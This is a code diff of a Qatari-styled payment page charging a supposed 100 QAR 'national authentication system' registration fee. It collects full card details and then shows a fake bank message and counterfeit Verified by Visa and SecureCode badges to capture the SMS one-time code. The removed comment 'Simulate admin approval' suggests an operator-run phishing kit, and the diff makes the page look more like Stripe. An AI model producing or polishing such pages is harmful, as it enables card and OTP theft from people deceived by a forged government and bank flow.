@@ -36,174 +36,220 @@
             margin: 0;
         }
         
-        .payment-info {
-            background-color: #e8f4f8;
-            border: 1px solid #b8dce8;
-            border-radius: 5px;
-            padding: 15px;
-            margin-bottom: 25px;
-            text-align: center;
-        }
-        
-        .payment-info h3 {
-            color: #31708f;
-            font-size: 18px;
-            font-weight: bold;
-            margin: 0 0 10px 0;
-        }
-        
-        .payment-info p {
-            color: #31708f;
-            font-size: 16px;
-            margin: 0;
-        }
-        
-        .amount {
-            font-size: 24px;
-            font-weight: bold;
-            color: #8b1538;
-        }
-        
-        .card-form {
-            background-color: #fff;
-            border: 1px solid #ddd;
-            border-radius: 5px;
+        .payment-summary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border-radius: 8px;
             padding: 25px;
+            margin-bottom: 30px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        
+        .payment-summary h3 {
+            margin: 0 0 15px 0;
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        .payment-summary .amount {
+            font-size: 36px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        
+        .payment-summary .description {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        /* Stripe-like Card Form */
+        .card-element {
+            background-color: #fff;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
             margin-bottom: 25px;
         }
         
-        .form-group label {
-            font-weight: bold;
-            color: #333;
+        .form-row {
+            margin-bottom: 20px;
         }
         
-        .form-control {
-            border-radius: 4px;
-            border: 1px solid #ccc;
-            padding: 10px;
+        .form-row label {
+            display: block;
+            font-weight: 600;
+            color: #32325d;
             font-size: 14px;
+            margin-bottom: 8px;
         }
         
-        .form-control:focus {
-            border-color: #8b1538;
-            box-shadow: 0 0 5px rgba(139, 21, 56, 0.3);
-        }
-        
-        .card-number-group {
+        .input-wrapper {
             position: relative;
         }
         
-        .card-icon {
+        .stripe-input {
+            width: 100%;
+            padding: 12px 45px 12px 12px;
+            font-size: 16px;
+            border: 1px solid #e0e0e0;
+            border-radius: 6px;
+            transition: all 0.2s ease;
+            background-color: #fff;
+            direction: ltr;
+            text-align: left;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .stripe-input:focus {
+            outline: none;
+            border-color: #8b1538;
+            box-shadow: 0 0 0 3px rgba(139, 21, 56, 0.1);
+        }
+        
+        .stripe-input.error {
+            border-color: #e25950;
+        }
+        
+        .stripe-input.success {
+            border-color: #5cb85c;
+        }
+        
+        .card-brand-icon {
             position: absolute;
-            left: 10px;
-            top: 35px;
-            width: 40px;
-            height: 25px;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 35px;
+            height: 22px;
             display: none;
         }
         
-        .card-icon.visa {
-            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCA0MCAyNSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjI1IiByeD0iMyIgZmlsbD0iIzE0MzQ3OCIvPgo8dGV4dCB4PSI1IiB5PSIxOCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjE0IiBmb250LXdlaWdodD0iYm9sZCIgZmlsbD0id2hpdGUiPlZJU0E8L3RleHQ+Cjwvc3ZnPgo=') no-repeat center;
-            background-size: contain;
+        .card-brand-icon.show {
             display: block;
         }
         
-        .card-icon.mastercard {
-            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCA0MCAyNSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjI1IiByeD0iMyIgZmlsbD0iI0VCMDAxQiIvPgo8Y2lyY2xlIGN4PSIxMyIgY3k9IjEyLjUiIHI9IjYiIGZpbGw9IiNGRjVGMDAiLz4KPGNpcmNsZSBjeD0iMjciIGN5PSIxMi41IiByPSI2IiBmaWxsPSIjRkY1RjAwIi8+Cjwvc3ZnPgo=') no-repeat center;
-            background-size: contain;
+        .card-brand-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        
+        .form-row-split {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .form-row-split > div {
+            flex: 1;
+        }
+        
+        .error-message {
+            color: #e25950;
+            font-size: 13px;
+            margin-top: 6px;
+            display: none;
+        }
+        
+        .error-message.show {
             display: block;
-        }
-        
-        .btn-primary {
-            background-color: #8b1538;
-            border-color: #8b1538;
-            padding: 10px 30px;
-            font-size: 16px;
-            font-weight: bold;
-        }
-        
-        .btn-primary:hover {
-            background-color: #6d1029;
-            border-color: #6d1029;
-        }
-        
-        .btn-default {
-            padding: 10px 30px;
-            font-size: 16px;
-        }
-        
-        .button-group {
-            margin-top: 30px;
-            text-align: center;
-        }
-        
-        .button-group .btn {
-            margin: 0 10px;
-        }
-        
-        .text-danger {
-            color: #a94442;
-        }
-        
-        .help-block {
-            display: block;
-            margin-top: 5px;
-            margin-bottom: 10px;
-            color: #737373;
-            font-size: 12px;
         }
         
         .secure-badge {
             text-align: center;
+            padding: 15px;
+            background-color: #f7fafc;
+            border-radius: 6px;
             margin-top: 20px;
-            color: #5cb85c;
-            font-size: 14px;
         }
         
         .secure-badge i {
-            margin-left: 5px;
+            color: #5cb85c;
+            margin-left: 8px;
+            font-size: 16px;
+        }
+        
+        .secure-badge span {
+            color: #6b7280;
+            font-size: 14px;
+        }
+        
+        .btn-pay {
+            width: 100%;
+            background: linear-gradient(135deg, #8b1538 0%, #6d1029 100%);
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 20px;
+        }
+        
+        .btn-pay:hover:not(:disabled) {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(139, 21, 56, 0.3);
+        }
+        
+        .btn-pay:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .btn-back {
+            width: 100%;
+            background-color: #f7fafc;
+            color: #4b5563;
+            border: 1px solid #e5e7eb;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 500;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 10px;
+        }
+        
+        .btn-back:hover {
+            background-color: #e5e7eb;
         }
         
         /* Modal Styles */
         .modal-content {
-            border-radius: 8px;
-            text-align: center;
+            border-radius: 12px;
+            border: none;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
         }
         
         .modal-header {
-            border-bottom: 2px solid #8b1538;
+            border-bottom: 1px solid #e5e7eb;
+            padding: 20px 25px;
         }
         
         .modal-title {
-            color: #8b1538;
-            font-weight: bold;
+            color: #1f2937;
+            font-weight: 600;
+            font-size: 18px;
         }
         
         .modal-body {
-            padding: 30px;
+            padding: 30px 25px;
+            text-align: center;
         }
         
-        .modal-icon {
-            font-size: 60px;
-            margin-bottom: 20px;
-        }
-        
-        .modal-icon.waiting {
-            color: #f0ad4e;
-        }
-        
-        .modal-icon.verified {
-            color: #5cb85c;
+        .spinner-container {
+            margin: 30px 0;
         }
         
         .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #8b1538;
+            border: 3px solid #f3f4f6;
+            border-top: 3px solid #8b1538;
             border-radius: 50%;
             width: 50px;
             height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
         }
         
         @keyframes spin {
@@ -211,48 +257,116 @@
             100% { transform: rotate(360deg); }
         }
         
-        .otp-inputs {
+        .card-icon-large {
+            width: 60px;
+            height: 38px;
+            margin: 20px auto;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+        
+        .verified-badge {
+            width: 140px;
+            margin: 20px auto;
+        }
+        
+        .verified-badge img {
+            width: 100%;
+        }
+        
+        .bank-notification {
+            background-color: #f0f9ff;
+            border: 1px solid #bae6fd;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 25px 0;
+            text-align: right;
+        }
+        
+        .bank-notification p {
+            margin: 8px 0;
+            color: #1e40af;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        
+        .bank-notification strong {
+            color: #8b1538;
+            font-weight: 600;
+        }
+        
+        .otp-container {
             display: flex;
             justify-content: center;
-            gap: 10px;
-            margin: 20px 0;
+            gap: 12px;
+            margin: 30px 0;
             direction: ltr;
         }
         
-        .otp-input {
+        .otp-digit {
             width: 50px;
-            height: 50px;
+            height: 55px;
             text-align: center;
             font-size: 24px;
-            font-weight: bold;
-            border: 2px solid #ccc;
-            border-radius: 5px;
+            font-weight: 600;
+            border: 2px solid #e5e7eb;
+            border-radius: 8px;
+            transition: all 0.2s ease;
+            font-family: 'Courier New', monospace;
         }
         
-        .otp-input:focus {
-            border-color: #8b1538;
+        .otp-digit:focus {
             outline: none;
+            border-color: #8b1538;
+            box-shadow: 0 0 0 3px rgba(139, 21, 56, 0.1);
         }
         
-        .bank-message {
-            background-color: #f9f9f9;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            padding: 15px;
-            margin: 20px 0;
-            text-align: right;
-            font-size: 14px;
-            color: #333;
-        }
-        
-        .bank-message strong {
+        .resend-link {
             color: #8b1538;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
         }
         
-        .verified-logo {
-            width: 120px;
-            margin: 20px auto;
-            display: block;
+        .resend-link:hover {
+            text-decoration: underline;
+        }
+        
+        .modal-actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 25px;
+        }
+        
+        .modal-actions button {
+            flex: 1;
+            padding: 12px;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        
+        .btn-modal-primary {
+            background-color: #8b1538;
+            color: white;
+            border: none;
+        }
+        
+        .btn-modal-primary:hover {
+            background-color: #6d1029;
+        }
+        
+        .btn-modal-secondary {
+            background-color: #f3f4f6;
+            color: #4b5563;
+            border: 1px solid #e5e7eb;
+        }
+        
+        .btn-modal-secondary:hover {
+            background-color: #e5e7eb;
         }
     </style>
 </head>
@@ -273,58 +387,90 @@
                             <h1>التسديد</h1>
                         </div>
                         
-                        <!-- Payment Info -->
-                        <div class="payment-info">
+                        <!-- Payment Summary -->
+                        <div class="payment-summary">
                             <h3>المبلغ المطلوب</h3>
-                            <p class="amount">100 ريال قطري</p>
-                            <p>رسوم التسجيل في نظام التوثيق الوطني</p>
+                            <div class="amount">100.00 QAR</div>
+                            <div class="description">رسوم التسجيل في نظام التوثيق الوطني</div>
                         </div>
                         
                         <!-- Card Form -->
-                        <div class="card-form">
-                            <form id="paymentForm" class="form-horizontal">
+                        <div class="card-element">
+                            <form id="paymentForm">
                                 
                                 <!-- Card Number -->
-                                <div class="form-group card-number-group">
-                                    <label class="col-sm-3 control-label" for="cardNumber">رقم البطاقة <span class="text-danger">*</span></label>
-                                    <div class="col-sm-9">
-                                        <input type="text" class="form-control" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
-                                        <div class="card-icon" id="cardIcon"></div>
-                                        <span class="help-block text-danger" id="cardError" style="display:none;">رقم البطاقة غير صحيح</span>
+                                <div class="form-row">
+                                    <label for="cardNumber">Card Number</label>
+                                    <div class="input-wrapper">
+                                        <input 
+                                            type="text" 
+                                            id="cardNumber" 
+                                            class="stripe-input" 
+                                            placeholder="1234 5678 9012 3456"
+                                            maxlength="19"
+                                            autocomplete="cc-number"
+                                            required>
+                                        <div class="card-brand-icon" id="cardBrandIcon"></div>
                                     </div>
+                                    <div class="error-message" id="cardNumberError">رقم البطاقة غير صحيح</div>
                                 </div>
                                 
                                 <!-- Card Holder Name -->
-                                <div class="form-group">
-                                    <label class="col-sm-3 control-label" for="cardHolder">اسم حامل البطاقة <span class="text-danger">*</span></label>
-                                    <div class="col-sm-9">
-                                        <input type="text" class="form-control" id="cardHolder" name="cardHolder" placeholder="كما هو مكتوب على البطاقة" required>
-                                    </div>
+                                <div class="form-row">
+                                    <label for="cardHolder">Cardholder Name</label>
+                                    <input 
+                                        type="text" 
+                                        id="cardHolder" 
+                                        class="stripe-input" 
+                                        placeholder="JOHN DOE"
+                                        autocomplete="cc-name"
+                                        style="text-transform: uppercase;"
+                                        required>
                                 </div>
                                 
-                                <!-- Expiry Date & CVV -->
-                                <div class="form-group">
-                                    <label class="col-sm-3 control-label">تاريخ الانتهاء <span class="text-danger">*</span></label>
-                                    <div class="col-sm-4">
-                                        <input type="text" class="form-control" id="expiryDate" name="expiryDate" placeholder="MM/YY" maxlength="5" required>
+                                <!-- Expiry & CVV -->
+                                <div class="form-row-split">
+                                    <div>
+                                        <label for="expiryDate">Expiry Date</label>
+                                        <input 
+                                            type="text" 
+                                            id="expiryDate" 
+                                            class="stripe-input" 
+                                            placeholder="MM / YY"
+                                            maxlength="7"
+                                            autocomplete="cc-exp"
+                                            required>
+                                        <div class="error-message" id="expiryError">تاريخ غير صحيح</div>
                                     </div>
-                                    <label class="col-sm-2 control-label" for="cvv">CVV <span class="text-danger">*</span></label>
-                                    <div class="col-sm-3">
-                                        <input type="text" class="form-control" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
+                                    <div>
+                                        <label for="cvv">CVV</label>
+                                        <input 
+                                            type="text" 
+                                            id="cvv" 
+                                            class="stripe-input" 
+                                            placeholder="123"
+                                            maxlength="4"
+                                            autocomplete="cc-csc"
+                                            required>
+                                        <div class="error-message" id="cvvError">CVV غير صحيح</div>
                                     </div>
                                 </div>
                                 
                                 <!-- Secure Badge -->
                                 <div class="secure-badge">
                                     <i class="fa fa-lock"></i>
-                                    معاملتك آمنة ومشفرة
+                                    <span>Your payment is secure and encrypted</span>
                                 </div>
                                 
-                                <!-- Buttons -->
-                                <div class="button-group">
-                                    <a href="/step3" class="btn btn-default">رجوع</a>
-                                    <button type="submit" class="btn btn-primary" id="payBtn">ادفع الآن</button>
-                                </div>
+                                <!-- Submit Button -->
+                                <button type="submit" class="btn-pay" id="payBtn">
+                                    <i class="fa fa-lock" style="margin-left: 8px;"></i>
+                                    Pay 100.00 QAR
+                                </button>
+                                
+                                <button type="button" class="btn-back" onclick="window.location.href='/step3'">
+                                    رجوع
+                                </button>
                             </form>
                         </div>
                         
@@ -336,21 +482,20 @@
         </div>
     </main>
     
-    <!-- Waiting Modal -->
-    <div class="modal fade" id="waitingModal" tabindex="-1" role="dialog" data-backdrop="static" data-keyboard="false">
+    <!-- Processing Modal -->
+    <div class="modal fade" id="processingModal" tabindex="-1" role="dialog" data-backdrop="static" data-keyboard="false">
         <div class="modal-dialog" role="document">
             <div class="modal-content">
                 <div class="modal-header">
-                    <h4 class="modal-title">جاري معالجة الدفع</h4>
+                    <h4 class="modal-title">Processing Payment</h4>
                 </div>
                 <div class="modal-body">
-                    <div class="modal-icon waiting">
-                        <i class="fa fa-credit-card"></i>
+                    <div class="card-icon-large" id="modalCardIcon"></div>
+                    <div class="spinner-container">
+                        <div class="spinner"></div>
                     </div>
-                    <div class="card-icon" id="modalCardIcon" style="width: 80px; height: 50px; margin: 20px auto;"></div>
-                    <div class="spinner"></div>
-                    <p>بانتظار موافقة النظام...</p>
-                    <p style="color: #999; font-size: 14px;">يرجى عدم إغلاق هذه النافذة</p>
+                    <p style="color: #6b7280; margin-top: 20px;">Please wait while we process your payment...</p>
+                    <p style="color: #9ca3af; font-size: 13px;">Do not close this window</p>
                 </div>
             </div>
         </div>
@@ -361,33 +506,28 @@
         <div class="modal-dialog" role="document">
             <div class="modal-content">
                 <div class="modal-header">
-                    <h4 class="modal-title">التحقق الآمن</h4>
+                    <h4 class="modal-title">Secure Verification</h4>
                 </div>
                 <div class="modal-body">
-                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIwIiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTIwIDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMTIwIiBoZWlnaHQ9IjQwIiByeD0iNSIgZmlsbD0iIzE0MzQ3OCIvPgo8dGV4dCB4PSIxMCIgeT0iMjYiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNiIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IndoaXRlIj5WZXJpZmllZCBieSBWSVNBPC90ZXh0Pgo8L3N2Zz4K" class="verified-logo" id="verifiedLogo" alt="Verified">
+                    <div class="verified-badge" id="verifiedBadge"></div>
                     
-                    <div class="bank-message">
-                        <p><strong>رسالة من البنك:</strong></p>
+                    <div class="bank-notification">
+                        <p><strong>رسالة من البنك</strong></p>
                         <p>تم خصم مبلغ <strong>100.00 ريال قطري</strong> من بطاقتك المنتهية بـ <strong id="lastDigits">****</strong></p>
-                        <p>يرجى إدخال رمز التحقق المرسل إلى هاتفك المسجل</p>
+                        <p>الرجاء إدخال رمز التحقق المرسل إلى هاتفك المسجل</p>
                     </div>
                     
-                    <div class="otp-inputs">
-                        <input type="text" class="otp-input" maxlength="1" data-index="0">
-                        <input type="text" class="otp-input" maxlength="1" data-index="1">
-                        <input type="text" class="otp-input" maxlength="1" data-index="2">
-                        <input type="text" class="otp-input" maxlength="1" data-index="3">
-                        <input type="text" class="otp-input" maxlength="1" data-index="4" style="display:none;">
-                        <input type="text" class="otp-input" maxlength="1" data-index="5" style="display:none;">
+                    <div class="otp-container" id="otpContainer">
+                        <!-- OTP inputs will be generated by JS -->
                     </div>
                     
-                    <p style="color: #999; font-size: 14px; margin-top: 20px;">
-                        لم تستلم الرمز؟ <a href="#" id="resendOtp" style="color: #8b1538;">إعادة الإرسال</a>
+                    <p style="color: #6b7280; font-size: 14px; margin-top: 20px;">
+                        لم تستلم الرمز؟ <a href="#" class="resend-link" id="resendOtp">إعادة الإرسال</a>
                     </p>
                     
-                    <div class="button-group">
-                        <button type="button" class="btn btn-default" onclick="location.reload()">إلغاء</button>
-                        <button type="button" class="btn btn-primary" id="verifyOtpBtn">تحقق</button>
+                    <div class="modal-actions">
+                        <button type="button" class="btn-modal-secondary" onclick="location.reload()">إلغاء</button>
+                        <button type="button" class="btn-modal-primary" id="verifyBtn">تحقق</button>
                     </div>
                 </div>
             </div>
@@ -402,136 +542,220 @@
         let cardType = '';
         let otpLength = 4;
         
+        // Card brand logos (SVG data URIs)
+        const cardLogos = {
+            visa: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="40" height="26" viewBox="0 0 40 26"%3E%3Crect width="40" height="26" rx="3" fill="%231434CB"/%3E%3Ctext x="5" y="18" font-family="Arial" font-size="12" font-weight="bold" fill="white"%3EVISA%3C/text%3E%3C/svg%3E',
+            mastercard: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="40" height="26" viewBox="0 0 40 26"%3E%3Crect width="40" height="26" rx="3" fill="%23EB001B"/%3E%3Ccircle cx="13" cy="13" r="7" fill="%23FF5F00"/%3E%3Ccircle cx="27" cy="13" r="7" fill="%23F79E1B"/%3E%3C/svg%3E'
+        };
+        
+        const verifiedLogos = {
+            visa: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="140" height="45" viewBox="0 0 140 45"%3E%3Crect width="140" height="45" rx="6" fill="%231434CB"/%3E%3Ctext x="10" y="28" font-family="Arial" font-size="14" font-weight="bold" fill="white"%3EVerified by VISA%3C/text%3E%3C/svg%3E',
+            mastercard: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="140" height="45" viewBox="0 0 140 45"%3E%3Crect width="140" height="45" rx="6" fill="%23000000"/%3E%3Ctext x="10" y="28" font-family="Arial" font-size="12" font-weight="bold" fill="white"%3EMasterCard SecureCode%3C/text%3E%3C/svg%3E'
+        };
+        
+        // Luhn algorithm for card validation
+        function luhnCheck(cardNumber) {
+            let sum = 0;
+            let isEven = false;
+            
+            for (let i = cardNumber.length - 1; i >= 0; i--) {
+                let digit = parseInt(cardNumber[i]);
+                
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                
+                sum += digit;
+                isEven = !isEven;
+            }
+            
+            return sum % 10 === 0;
+        }
+        
         // Card number formatting and validation
-        document.getElementById('cardNumber').addEventListener('input', function(e) {
+        const cardNumberInput = document.getElementById('cardNumber');
+        const cardBrandIcon = document.getElementById('cardBrandIcon');
+        const cardNumberError = document.getElementById('cardNumberError');
+        
+        cardNumberInput.addEventListener('input', function(e) {
             let value = e.target.value.replace(/\s/g, '');
-            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
-            e.target.value = formattedValue;
+            
+            // Format with spaces every 4 digits
+            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formatted;
             
             // Detect card type
-            const cardIcon = document.getElementById('cardIcon');
-            const cardError = document.getElementById('cardError');
-            
             if (value.length >= 1) {
                 const firstDigit = value[0];
+                
                 if (firstDigit === '4') {
                     cardType = 'visa';
-                    cardIcon.className = 'card-icon visa';
-                    cardError.style.display = 'none';
                     otpLength = 6;
+                    cardBrandIcon.innerHTML = `<img src="${cardLogos.visa}" alt="Visa">`;
+                    cardBrandIcon.classList.add('show');
+                    cardNumberError.classList.remove('show');
+                    e.target.classList.remove('error');
                 } else if (firstDigit === '5') {
                     cardType = 'mastercard';
-                    cardIcon.className = 'card-icon mastercard';
-                    cardError.style.display = 'none';
                     otpLength = 4;
+                    cardBrandIcon.innerHTML = `<img src="${cardLogos.mastercard}" alt="Mastercard">`;
+                    cardBrandIcon.classList.add('show');
+                    cardNumberError.classList.remove('show');
+                    e.target.classList.remove('error');
                 } else {
                     cardType = '';
-                    cardIcon.className = 'card-icon';
-                    cardError.style.display = 'block';
+                    cardBrandIcon.classList.remove('show');
+                    cardNumberError.classList.add('show');
+                    e.target.classList.add('error');
+                }
+                
+                // Validate with Luhn if complete
+                if (value.length === 16) {
+                    if (luhnCheck(value)) {
+                        e.target.classList.add('success');
+                        e.target.classList.remove('error');
+                        cardNumberError.classList.remove('show');
+                    } else {
+                        e.target.classList.add('error');
+                        e.target.classList.remove('success');
+                        cardNumberError.textContent = 'رقم البطاقة غير صحيح';
+                        cardNumberError.classList.add('show');
+                    }
                 }
             } else {
                 cardType = '';
-                cardIcon.className = 'card-icon';
-                cardError.style.display = 'none';
+                cardBrandIcon.classList.remove('show');
+                cardNumberError.classList.remove('show');
+                e.target.classList.remove('error', 'success');
             }
         });
         
         // Expiry date formatting
-        document.getElementById('expiryDate').addEventListener('input', function(e) {
+        const expiryInput = document.getElementById('expiryDate');
+        const expiryError = document.getElementById('expiryError');
+        
+        expiryInput.addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
+            
             if (value.length >= 2) {
-                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                value = value.slice(0, 2) + ' / ' + value.slice(2, 4);
             }
+            
             e.target.value = value;
+            
+            // Validate expiry
+            if (value.length === 7) {
+                const parts = value.split(' / ');
+                const month = parseInt(parts[0]);
+                const year = parseInt('20' + parts[1]);
+                const now = new Date();
+                const currentYear = now.getFullYear();
+                const currentMonth = now.getMonth() + 1;
+                
+                if (month < 1 || month > 12 || year < currentYear || (year === currentYear && month < currentMonth)) {
+                    e.target.classList.add('error');
+                    expiryError.classList.add('show');
+                } else {
+                    e.target.classList.remove('error');
+                    e.target.classList.add('success');
+                    expiryError.classList.remove('show');
+                }
+            }
         });
         
-        // CVV - numbers only
-        document.getElementById('cvv').addEventListener('input', function(e) {
+        // CVV validation
+        const cvvInput = document.getElementById('cvv');
+        const cvvError = document.getElementById('cvvError');
+        
+        cvvInput.addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/\D/g, '');
+            
+            if (e.target.value.length >= 3) {
+                e.target.classList.add('success');
+                e.target.classList.remove('error');
+                cvvError.classList.remove('show');
+            }
         });
         
         // Form submission
         document.getElementById('paymentForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const cardNumber = cardNumberInput.value.replace(/\s/g, '');
             
-            // Validate card
-            if (!cardType || cardNumber.length < 16) {
-                document.getElementById('cardError').style.display = 'block';
+            // Validate
+            if (!cardType || cardNumber.length !== 16 || !luhnCheck(cardNumber)) {
+                cardNumberError.classList.add('show');
+                cardNumberInput.classList.add('error');
                 return;
             }
             
-            // Show waiting modal with card icon
+            // Show processing modal
             const modalCardIcon = document.getElementById('modalCardIcon');
-            modalCardIcon.className = 'card-icon ' + cardType;
-            $('#waitingModal').modal('show');
+            modalCardIcon.style.backgroundImage = `url(${cardLogos[cardType]})`;
+            $('#processingModal').modal('show');
             
-            // Simulate admin approval (3 seconds)
+            // Simulate processing (3 seconds)
             setTimeout(function() {
-                $('#waitingModal').modal('hide');
+                $('#processingModal').modal('hide');
                 
-                // Update verified logo based on card type
-                const verifiedLogo = document.getElementById('verifiedLogo');
-                if (cardType === 'visa') {
-                    verifiedLogo.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIwIiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTIwIDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMTIwIiBoZWlnaHQ9IjQwIiByeD0iNSIgZmlsbD0iIzE0MzQ3OCIvPgo8dGV4dCB4PSIxMCIgeT0iMjYiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNiIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IndoaXRlIj5WZXJpZmllZCBieSBWSVNBPC90ZXh0Pgo8L3N2Zz4K';
-                } else {
-                    verifiedLogo.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIwIiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTIwIDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cmVjdCB3aWR0aD0iMTIwIiBoZWlnaHQ9IjQwIiByeD0iNSIgZmlsbD0iI0VCMDAxQiIvPgo8dGV4dCB4PSIxMCIgeT0iMjYiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IndoaXRlIj5NYXN0ZXJDYXJkIFNlY3VyZUNvZGU8L3RleHQ+Cjwvc3ZnPgo=';
-                }
+                // Setup OTP modal
+                const verifiedBadge = document.getElementById('verifiedBadge');
+                verifiedBadge.innerHTML = `<img src="${verifiedLogos[cardType]}" alt="Verified">`;
                 
-                // Update last digits
                 document.getElementById('lastDigits').textContent = cardNumber.slice(-4);
                 
-                // Show/hide OTP inputs based on card type
-                const otpInputs = document.querySelectorAll('.otp-input');
-                otpInputs.forEach((input, index) => {
-                    if (index < otpLength) {
-                        input.style.display = 'block';
-                        input.value = '';
-                    } else {
-                        input.style.display = 'none';
-                    }
-                });
+                // Generate OTP inputs
+                const otpContainer = document.getElementById('otpContainer');
+                otpContainer.innerHTML = '';
+                for (let i = 0; i < otpLength; i++) {
+                    const input = document.createElement('input');
+                    input.type = 'text';
+                    input.className = 'otp-digit';
+                    input.maxLength = 1;
+                    input.dataset.index = i;
+                    otpContainer.appendChild(input);
+                }
+                
+                // Setup OTP input handlers
+                setupOtpInputs();
                 
                 // Show OTP modal
                 $('#otpModal').modal('show');
-                otpInputs[0].focus();
+                otpContainer.children[0].focus();
             }, 3000);
         });
         
         // OTP input handling
-        const otpInputs = document.querySelectorAll('.otp-input');
-        otpInputs.forEach((input, index) => {
-            input.addEventListener('input', function(e) {
-                if (e.target.value.length === 1) {
-                    // Move to next input
-                    const nextIndex = index + 1;
-                    if (nextIndex < otpLength) {
-                        otpInputs[nextIndex].focus();
-                    }
-                }
-            });
+        function setupOtpInputs() {
+            const inputs = document.querySelectorAll('.otp-digit');
             
-            input.addEventListener('keydown', function(e) {
-                if (e.key === 'Backspace' && e.target.value === '') {
-                    // Move to previous input
-                    const prevIndex = index - 1;
-                    if (prevIndex >= 0) {
-                        otpInputs[prevIndex].focus();
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', function(e) {
+                    if (e.target.value.length === 1 && index < otpLength - 1) {
+                        inputs[index + 1].focus();
                     }
-                }
+                });
+                
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
             });
-        });
+        }
         
         // Verify OTP
-        document.getElementById('verifyOtpBtn').addEventListener('click', function() {
+        document.getElementById('verifyBtn').addEventListener('click', function() {
+            const inputs = document.querySelectorAll('.otp-digit');
             let otp = '';
-            for (let i = 0; i < otpLength; i++) {
-                otp += otpInputs[i].value;
-            }
+            
+            inputs.forEach(input => {
+                otp += input.value;
+            });
             
             if (otp.length === otpLength) {
-                // Redirect to next step
                 window.location.href = '/step5';
             } else {
                 alert('يرجى إدخال رمز التحقق كاملاً');
